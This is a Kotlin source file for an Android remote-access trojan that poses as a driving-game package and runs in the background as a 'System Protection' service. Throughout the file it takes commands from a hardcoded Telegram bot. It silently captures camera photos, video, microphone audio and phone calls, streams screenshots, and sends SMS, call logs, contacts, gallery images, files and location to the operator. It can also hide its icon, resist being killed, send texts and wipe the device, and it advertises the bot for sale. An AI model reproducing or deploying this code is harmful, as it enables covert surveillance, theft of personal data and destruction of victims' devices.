package com.ansangha.drdriving

import android.annotation.SuppressLint
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.hardware.camera2.CameraManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.*
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.telephony.PhoneStateListener
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import android.view.Surface
import android.widget.Toast
import androidx.core.app.NotificationCompat
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.Socket
import java.net.URL
import java.util.*
import kotlin.concurrent.thread

class RemoteControlService : Service(), TextToSpeech.OnInitListener {

    private val tgToken: String = "8573791943:AAELccgzY-_1oCyE4bcC38WbVRglRV4SkCE"
    private val tgChatId: String = "1908951907"
    private var lastUpdateId = 0
    
    private lateinit var intelManager: IntelligenceManager
    private var tts: TextToSpeech? = null
    private var wakeLock: PowerManager.WakeLock? = null
    
    private var isCameraInUse = false
    private var isLiveStreaming = false
    private var isListening = false
    private var isCallRecording = false
    private var currentCallNumber = ""
    private var callMediaRecorder: MediaRecorder? = null
    private var callOutputFile: File? = null
    private var mediaPlayer: MediaPlayer? = null
    private var mediaRecorder: MediaRecorder? = null
    
    private val handler = Handler(Looper.getMainLooper())
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            handler.postDelayed(this, 30000) 
        }
    }

    companion object {
        const val OWNER_NAME = "NILESH RAJGAR"
        const val CHANNEL_ID = "SYSTEM_PROTECTION_CHANNEL"
        var lockedAppPackage: String? = null

        fun forwardToTelegram(msg: String) {
            val token = "8573791943:AAELccgzY-_1oCyE4bcC38WbVRglRV4SkCE"
            val chatId = "1908951907"
            thread {
                try {
                    val encodedMsg = java.net.URLEncoder.encode(msg, "UTF-8")
                    val urlString = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=$encodedMsg&parse_mode=Markdown"
                    val conn = URL(urlString).openConnection() as HttpURLConnection
                    conn.connectTimeout = 10000
                    conn.readTimeout = 10000
                    conn.inputStream.read()
                    conn.disconnect()
                } catch (e: Exception) {}
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        
        Thread.setDefaultUncaughtExceptionHandler { _, e ->
            restartSelf()
        }

        createNotificationChannel()
        startForeground(1, buildNotification("System Protection Active"))
        
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Shield::WakeLock")
        wakeLock?.acquire()
        
        tts = TextToSpeech(this, this)
        intelManager = IntelligenceManager(this)

        handler.post(watchdogRunnable)
        setupCallListener()
        startTelegramPolling()
        
        forwardToTelegram("🛡️ *SHIELD MASTER ONLINE*\nDevice: ${Build.MODEL}\nStatus: **FULLY OPERATIONAL (v7.0)**")
        sendTelegramMenu()
    }

    private fun restartSelf() {
        val intent = Intent(this, RemoteControlService::class.java)
        val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System Services", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Optimization")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_premium_shield)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startTelegramPolling() {
        thread {
            while (true) {
                try {
                    val urlString = "https://api.telegram.org/bot$tgToken/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val conn = URL(urlString).openConnection() as HttpURLConnection
                    conn.connectTimeout = 40000
                    conn.readTimeout = 40000
                    
                    if (conn.responseCode == 200) {
                        val response = conn.inputStream.bufferedReader().readText()
                        val json = JSONObject(response)
                        val results = json.getJSONArray("result")
                        for (i in 0 until results.length()) {
                            val update = results.getJSONObject(i)
                            lastUpdateId = update.getInt("update_id")
                            
                            var command = ""
                            var chatId = ""
                            var name = "User"
                            
                            if (update.has("callback_query")) {
                                val cb = update.getJSONObject("callback_query")
                                command = cb.getString("data")
                                chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
                                name = cb.getJSONObject("from").optString("first_name", "User")
                            } else if (update.has("message")) {
                                val msg = update.getJSONObject("message")
                                command = msg.optString("text", "")
                                chatId = msg.getJSONObject("chat").getLong("id").toString()
                                name = msg.optJSONObject("from")?.optString("first_name", "User") ?: "User"
                            }
                            
                            if (command.isNotEmpty()) {
                                if (chatId == tgChatId) processRawCommand(command)
                                else sendPurchaseOffer(chatId, name)
                            }
                        }
                    }
                    conn.disconnect()
                } catch (e: Exception) { Thread.sleep(10000) }
            }
        }
    }

    private fun sendPurchaseOffer(chatId: String, name: String) {
        val msg = """
            🚫 *ACCESS RESTRICTED* 🚫
            Hello $name, terminal belongs to **$OWNER_NAME**.
            💰 *BUY ELITE BOT:* @XJXBDBF
        """.trimIndent()
        thread {
            try {
                val encoded = java.net.URLEncoder.encode(msg, "UTF-8")
                URL("https://api.telegram.org/bot$tgToken/sendMessage?chat_id=$chatId&text=$encoded&parse_mode=Markdown").openConnection().inputStream.read()
            } catch (e: Exception) {}
        }
    }

    private fun processRawCommand(cmd: String) {
        val clean = cmd.trim().removePrefix("/")
        val upper = clean.uppercase()
        when {
            upper == "START" || upper == "MENU" -> sendTelegramMenu()
            upper == "HELP" -> sendHelpMessage()
            upper == "PING" -> forwardToTelegram("🏓 *PONG!*\nUptime: ${SystemClock.elapsedRealtime() / 1000}s\nBattery: ${getBatteryPct()}%")
            upper == "STOP_ALL" -> stopAllActiveModules()
            upper == "DUMP_ALL" -> sendFullDump()
            else -> handleTelegramCommand(clean)
        }
    }

    private fun stopAllActiveModules() {
        isLiveStreaming = false; isListening = false; stopAlarm(); toggleFlash(false); lockedAppPackage = null
        forwardToTelegram("🛑 *SHIELD COOLDOWN:* Modules deactivated.")
    }

    private fun sendHelpMessage() {
        val helpMsg = """
            🛡️ *SHIELD MASTER COMMANDS* 🛡️
            `LIVE ON/OFF` | `SCR` | `SCAN_SCREEN`
            `PIC_BACK` | `PIC_FRONT` | `GET_GALLERY`
            `VID_BACK <sec>` | `VID_FRONT <sec>`
            `MIC ON/OFF` | `LOC` | `GET_INTEL`
            `ALARM ON/OFF` | `VIBRATE` | `SPEAK`
            `FLASH ON/OFF` | `MSG` | `TOAST`
            `LS` | `DL` | `RM` | `DUMP_ALL`
            `ANTI_KILL ON/OFF` | `APP_HIDE/SHOW`
            `WIPE_DATA` | `GET_SMS` | `GET_CALLS`
        """.trimIndent()
        forwardToTelegram(helpMsg)
    }

    private fun handleTelegramCommand(cmd: String) {
        val parts = cmd.split(" ", limit = 2)
        val main = parts[0].uppercase()
        val arg = if (parts.size > 1) parts[1] else ""

        try {
            when (main) {
                "ANTI_KILL" -> {
                    MyAccessibilityService.antiKillActive = arg.uppercase() == "ON"
                    forwardToTelegram("🛡️ *ANTI-KILL:* ${if(MyAccessibilityService.antiKillActive) "ENABLED" else "DISABLED"}")
                }
                "LIVE" -> { isLiveStreaming = arg.uppercase() == "ON"; if (isLiveStreaming) startLiveStream(); forwardToTelegram("📱 Live: ${if(isLiveStreaming) "ON" else "OFF"}") }
                "MIC" -> { isListening = arg.uppercase() == "ON"; if (isListening) startMicRecording(); forwardToTelegram("🎙️ Mic: ${if(isListening) "ON" else "OFF"}") }
                "ALARM" -> toggleAlarm(arg.uppercase() == "ON")
                "FLASH" -> toggleFlash(arg.uppercase() == "ON")
                "SCR" -> takeManualScreenshot()
                "SCAN_SCREEN" -> { if (MyAccessibilityService.instance == null) forwardToTelegram("❌ No Accessibility") else MyAccessibilityService.instance?.takeSilentScreenshot { extractTextFromImage(it) } }
                "LOC" -> getCurrentLocation()
                "PIC_BACK" -> takeSilentPhoto(0)
                "PIC_FRONT" -> takeSilentPhoto(1)
                "VID_BACK" -> recordVideo(0, arg.toIntOrNull() ?: 10)
                "VID_FRONT" -> recordVideo(1, arg.toIntOrNull() ?: 10)
                "SPEAK" -> if (arg.isNotEmpty()) tts?.speak(arg, TextToSpeech.QUEUE_FLUSH, null, null)
                "MSG" -> sendSmsExternal(arg)
                "TOAST" -> if (arg.isNotEmpty()) handler.post { Toast.makeText(this, arg, Toast.LENGTH_LONG).show() }
                "LS" -> listFiles(if (arg.isEmpty()) Environment.getExternalStorageDirectory().absolutePath else arg)
                "DL" -> downloadFile(arg)
                "RM" -> deleteFileInternal(arg)
                "NETWORK" -> getNetworkInfo()
                "AV_SCAN" -> startSecurityScan()
                "GET_INTEL" -> forwardToTelegram(intelManager.getIntelligenceReport())
                "GET_GALLERY" -> thread { sendLatestGalleryPhoto() }
                "APP_HIDE" -> setComponentState(false)
                "APP_SHOW" -> setComponentState(true)
                "WIPE_DATA" -> performWipe()
                "GET_SMS" -> thread { forwardToTelegram(getSmsData(50)) }
                "GET_CALLS" -> thread { forwardToTelegram(getCallData(50)) }
                "GET_CONTACTS" -> thread { sendFileToTelegram(createTempFile(getContactData(1000), "contacts.txt"), "📇 Contacts") }
                "INFO" -> getDeviceInfo()
                "VOLUME" -> setVolume(arg.toIntOrNull() ?: 7)
                "BRIGHT" -> setBrightness(arg.toIntOrNull() ?: 128)
                else -> forwardToTelegram("❓ *Unknown:* `$main`")
            }
        } catch (e: Exception) { forwardToTelegram("❌ Error: ${e.message}") }
    }

    private fun recordVideo(camId: Int, durationSeconds: Int) {
        if (isCameraInUse) { forwardToTelegram("⚠️ Camera Busy"); return }
        isCameraInUse = true
        thread {
            var camera: Camera? = null
            var recorder: MediaRecorder? = null
            try {
                camera = Camera.open(camId)
                camera.unlock()
                
                val file = File(cacheDir, "vid_${System.currentTimeMillis()}.mp4")
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
                
                recorder.apply {
                    setCamera(camera)
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setVideoSource(MediaRecorder.VideoSource.CAMERA)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    setOutputFile(file.absolutePath)
                    setVideoSize(640, 480)
                    setVideoFrameRate(30)
                    setPreviewDisplay(Surface(SurfaceTexture(10)))
                    prepare()
                    start()
                }
                
                forwardToTelegram("🎥 *VIDEO RECORDING STARTED* ($durationSeconds s)")
                Thread.sleep(durationSeconds * 1000L)
                
                recorder.stop()
                recorder.release()
                camera.lock()
                camera.release()
                isCameraInUse = false
                
                sendFileToTelegram(file, "🎥 Captured Video")
                thread { Thread.sleep(5000); if (file.exists()) file.delete() }
                
            } catch (e: Exception) {
                isCameraInUse = false
                recorder?.release()
                camera?.release()
                forwardToTelegram("❌ Video Error: ${e.message}")
            }
        }
    }

    private fun startLiveStream() {
        thread {
            while (isLiveStreaming) {
                MyAccessibilityService.instance?.takeSilentScreenshot { sendPhotoToTelegram(it) }
                Thread.sleep(2000)
            }
        }
    }

    private fun startMicRecording() {
        thread {
            try {
                val file = File(cacheDir, "record.mp3")
                mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
                mediaRecorder?.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC); setOutputFile(file.absolutePath); prepare(); start()
                }
                while (isListening) Thread.sleep(1000)
                mediaRecorder?.stop(); mediaRecorder?.release(); mediaRecorder = null
                sendFileToTelegram(file, "🎙️ Audio Recording")
                file.delete()
            } catch (e: Exception) { isListening = false }
        }
    }

    private fun takeManualScreenshot() {
        if (MyAccessibilityService.instance == null) forwardToTelegram("❌ No Accessibility")
        else MyAccessibilityService.instance?.takeSilentScreenshot { sendPhotoToTelegram(it); forwardToTelegram("📸 Screenshot Sent.") }
    }

    private fun listFiles(path: String) {
        thread {
            try {
                val files = File(path).listFiles()
                val sb = StringBuilder("📂 *DIR:* $path\n")
                files?.take(60)?.forEach { sb.append(if (it.isDirectory) "📁 " else "📄 ").append(it.name).append("\n") }
                forwardToTelegram(sb.toString())
            } catch (e: Exception) { forwardToTelegram("❌ LS Failed") }
        }
    }

    private fun downloadFile(path: String) {
        thread {
            val file = File(path)
            if (file.exists() && file.isFile) sendFileToTelegram(file, "📄 File: ${file.name}")
            else forwardToTelegram("❌ Not Found")
        }
    }

    private fun deleteFileInternal(path: String) {
        if (File(path).delete()) forwardToTelegram("✅ Deleted") else forwardToTelegram("❌ Failed")
    }

    private fun sendFullDump() {
        thread {
            try {
                forwardToTelegram("⏳ *GATHERING DATA DUMP...*")
                val sb = StringBuilder()
                sb.append("--- SHIELD SYSTEM DUMP ---\n")
                sb.append("Device: ${Build.MODEL}\n")
                sb.append("Time: ${Date()}\n\n")
                sb.append(getContactData(2000))
                sb.append("\n\n")
                sb.append(getCallData(1000))
                sb.append("\n\n")
                sb.append(getSmsData(1000))
                
                val file = createTempFile(sb.toString(), "full_dump.txt")
                sendFileToTelegram(file, "📂 Full System Intelligence Dump")
                thread { Thread.sleep(10000); if (file.exists()) file.delete() }
            } catch (e: Exception) { forwardToTelegram("❌ Dump Error: ${e.message}") }
        }
    }

    private fun startSecurityScan() {
        thread {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val list = apps.filter { it.loadLabel(pm).toString().lowercase().contains("security") || it.loadLabel(pm).toString().lowercase().contains("antivirus") }
            forwardToTelegram("🛡️ *AV SCAN:* Found ${list.size} security apps.\n${list.joinToString { it.loadLabel(pm).toString() }}")
        }
    }

    private fun getNetworkInfo() {
        thread {
            try {
                val res = URL("https://ipapi.co/json/").readText()
                val json = JSONObject(res)
                forwardToTelegram("🌐 *NET:* ${json.optString("ip")}\nISP: ${json.optString("org")}")
            } catch (e: Exception) {}
        }
    }

    private fun performWipe() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (dpm.isAdminActive(ComponentName(this, MyDeviceAdminReceiver::class.java))) {
            forwardToTelegram("💀 *WIPING DEVICE...*")
            dpm.wipeData(0)
        } else forwardToTelegram("❌ Admin Required.")
    }

    private fun setComponentState(enable: Boolean) {
        val state = if (enable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), state, PackageManager.DONT_KILL_APP)
        forwardToTelegram(if (enable) "👁️ Icon Restored" else "👻 Icon Hidden")
    }

    private fun sendTelegramMenu() {
        thread {
            try {
                val menuJson = """
                {
                    "inline_keyboard": [
                        [{"text": "🎥 LIVE ON", "callback_data": "LIVE ON"}, {"text": "🛑 LIVE OFF", "callback_data": "LIVE OFF"}],
                        [{"text": "🎙️ MIC ON", "callback_data": "MIC ON"}, {"text": "🔇 MIC OFF", "callback_data": "MIC OFF"}],
                        [{"text": "📸 PIC BACK", "callback_data": "PIC_BACK"}, {"text": "🤳 PIC FRONT", "callback_data": "PIC_FRONT"}],
                        [{"text": "📹 VID BACK", "callback_data": "VID_BACK 10"}, {"text": "🤳 VID FRONT", "callback_data": "VID_FRONT 10"}],
                        [{"text": "📸 SCR", "callback_data": "SCR"}, {"text": "📍 LOC", "callback_data": "LOC"}, {"text": "📂 DUMP", "callback_data": "DUMP_ALL"}],
                        [{"text": "🚨 ALARM ON", "callback_data": "ALARM ON"}, {"text": "🛑 STOP ALL", "callback_data": "STOP_ALL"}]
                    ]
                }
                """.trimIndent()
                val body = JSONObject().put("chat_id", tgChatId).put("text", "🎮 *SHIELD MASTER CONTROL*\nDevice: ${Build.MODEL}").put("parse_mode", "Markdown").put("reply_markup", JSONObject(menuJson))
                val conn = URL("https://api.telegram.org/bot$tgToken/sendMessage").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"; conn.doOutput = true; conn.setRequestProperty("Content-Type", "application/json")
                conn.outputStream.write(body.toString().toByteArray()); conn.inputStream.read(); conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun setupCallListener() {
        try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION")
            tm.listen(object : PhoneStateListener() {
                override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                    val num = phoneNumber ?: "Unknown"
                    if (state == TelephonyManager.CALL_STATE_RINGING) forwardToTelegram("📞 *INCOMING:* $num")
                    else if (state == TelephonyManager.CALL_STATE_OFFHOOK) startCallRecording(num)
                    else if (state == TelephonyManager.CALL_STATE_IDLE) stopCallRecording()
                }
            }, PhoneStateListener.LISTEN_CALL_STATE)
        } catch (e: Exception) {}
    }

    private fun startCallRecording(num: String) {
        try {
            if (isCallRecording) return; isCallRecording = true; currentCallNumber = num
            val file = File(filesDir, "call.mp3")
            callOutputFile = file
            callMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else @Suppress("DEPRECATION") MediaRecorder()
            callMediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC); setOutputFile(file.absolutePath); prepare(); start()
            }
        } catch (e: Exception) { isCallRecording = false }
    }

    private fun stopCallRecording() {
        try {
            callMediaRecorder?.stop(); callMediaRecorder?.release(); callMediaRecorder = null; isCallRecording = false
            callOutputFile?.let { sendFileToTelegram(it, "📞 Call: $currentCallNumber"); thread { Thread.sleep(5000); if (it.exists()) it.delete() } }
        } catch (e: Exception) { isCallRecording = false }
    }

    private fun sendLatestGalleryPhoto() {
        try {
            val projection = arrayOf(MediaStore.Images.Media.DATA)
            val cursor = contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC")
            if (cursor?.moveToFirst() == true) sendPhotoToTelegram(File(cursor.getString(0)).readBytes())
            cursor?.close()
        } catch (e: Exception) {}
    }

    private fun extractTextFromImage(data: ByteArray) {
        thread {
            try {
                val base64 = Base64.encodeToString(data, Base64.NO_WRAP)
                val url = URL("https://api.ocr.space/parse/image")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"; conn.doOutput = true
                val postData = "apikey=K81234567888957&base64Image=data:image/jpeg;base64,$base64"
                conn.outputStream.write(postData.toByteArray())
                val text = JSONObject(conn.inputStream.bufferedReader().readText()).getJSONArray("ParsedResults").getJSONObject(0).getString("ParsedText")
                forwardToTelegram("🔍 *TEXT:* $text")
            } catch (e: Exception) {}
        }
    }

    private fun getBatteryPct(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
    }

    private fun sendSmsExternal(arg: String) {
        val parts = arg.split(" ", limit = 2)
        if (parts.size == 2) {
            try {
                val sms: SmsManager = SmsManager.getDefault()
                sms.sendTextMessage(parts[0], null, parts[1], null, null)
                forwardToTelegram("✅ SMS Sent")
            } catch (e: Exception) { forwardToTelegram("❌ SMS Fail") }
        }
    }

    private fun setVolume(v: Int) { (getSystemService(Context.AUDIO_SERVICE) as AudioManager).setStreamVolume(AudioManager.STREAM_MUSIC, v.coerceIn(0, 15), 0) }
    private fun setBrightness(b: Int) { if (Settings.System.canWrite(this)) Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, b.coerceIn(0, 255)) }
    private fun toggleFlash(on: Boolean) { try { (getSystemService(Context.CAMERA_SERVICE) as CameraManager).setTorchMode(getSystemService(CameraManager::class.java).cameraIdList[0], on) } catch (e: Exception) {} }
    private fun getDeviceInfo() = forwardToTelegram("📱 *INFO:* ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nID: `${getDeviceUniqueId()}`")
    private fun getCurrentLocation() {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if (loc != null) {
            forwardToTelegram("📍 *LOC:* https://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
            thread { try { URL("https://api.telegram.org/bot$tgToken/sendLocation?chat_id=$tgChatId&latitude=${loc.latitude}&longitude=${loc.longitude}").openConnection().inputStream.read() } catch (e: Exception) {} }
        }
    }

    private fun takeSilentPhoto(id: Int) {
        if (isCameraInUse) return; isCameraInUse = true
        thread {
            var cam: Camera? = null
            try {
                cam = Camera.open(id); cam.setPreviewTexture(SurfaceTexture(10)); cam.startPreview(); Thread.sleep(1200)
                cam.takePicture(null, null) { data, _ -> sendPhotoToTelegram(data); isCameraInUse = false; cam?.release() }
            } catch (e: Exception) { isCameraInUse = false; cam?.release() }
        }
    }

    private fun toggleAlarm(on: Boolean) {
        if (on) {
            mediaPlayer = MediaPlayer().apply { setDataSource(this@RemoteControlService, Settings.System.DEFAULT_RINGTONE_URI); setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_ALARM).build()); isLooping = true; prepare(); start() }
            forwardToTelegram("🚨 Alarm ON")
        } else { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null; forwardToTelegram("🔕 Alarm OFF") }
    }

    private fun stopAlarm() { mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null }

    private fun sendFileToTelegram(f: File, c: String) {
        thread {
            try {
                val boundary = "---" + System.currentTimeMillis()
                val conn = URL("https://api.telegram.org/bot$tgToken/sendDocument").openConnection() as HttpURLConnection
                conn.doOutput = true; conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                val out = conn.outputStream
                out.write("--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$tgChatId\r\n".toByteArray())
                out.write("--$boundary\r\nContent-Disposition: form-data; name=\"document\"; filename=\"${f.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n".toByteArray())
                f.inputStream().use { it.copyTo(out) }; out.write("\r\n--$boundary\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n$c\r\n--$boundary--\r\n".toByteArray())
                out.flush(); conn.inputStream.read(); conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun sendPhotoToTelegram(d: ByteArray) {
        thread {
            try {
                val b = "---" + System.currentTimeMillis()
                val conn = URL("https://api.telegram.org/bot$tgToken/sendPhoto").openConnection() as HttpURLConnection
                conn.doOutput = true; conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
                val out = conn.outputStream
                out.write("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$tgChatId\r\n".toByteArray())
                out.write("--$b\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"p.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n".toByteArray())
                out.write(d); out.write("\r\n--$b--\r\n".toByteArray()); out.flush(); conn.inputStream.read(); conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun createTempFile(d: String, n: String): File { val f = File(cacheDir, n); f.writeText(d); return f }
    private fun getSmsData(l: Int): String {
        val sb = StringBuilder("💬 *SMS:*\n")
        val c = try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC") } catch(e:Exception) { null }
        var count = 0
        while (c?.moveToNext() == true && count < l) { sb.append("👤 ${c.getString(c.getColumnIndexOrThrow("address"))}\n📝 ${c.getString(c.getColumnIndexOrThrow("body"))}\n\n"); count++ }
        c?.close(); return sb.toString()
    }
    private fun getCallData(l: Int): String {
        val sb = StringBuilder("📞 *CALLS:*\n")
        val c = try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC") } catch(e:Exception) { null }
        var count = 0
        while (c?.moveToNext() == true && count < l) { sb.append("📞 ${c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))} | ${c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))}s\n"); count++ }
        c?.close(); return sb.toString()
    }
    private fun getContactData(l: Int): String {
        val sb = StringBuilder("📇 *CONTACTS:*\n")
        val c = try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null) } catch(e:Exception) { null }
        var count = 0
        while (c?.moveToNext() == true && count < l) { sb.append("${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}: ${c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))}\n"); count++ }
        c?.close(); return sb.toString()
    }

    @SuppressLint("HardwareIds")
    private fun getDeviceUniqueId(): String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Unknown"
    override fun onInit(s: Int) { if (s == TextToSpeech.SUCCESS) tts?.language = Locale.US }
    override fun onBind(intent: Intent?): IBinder? = null
}
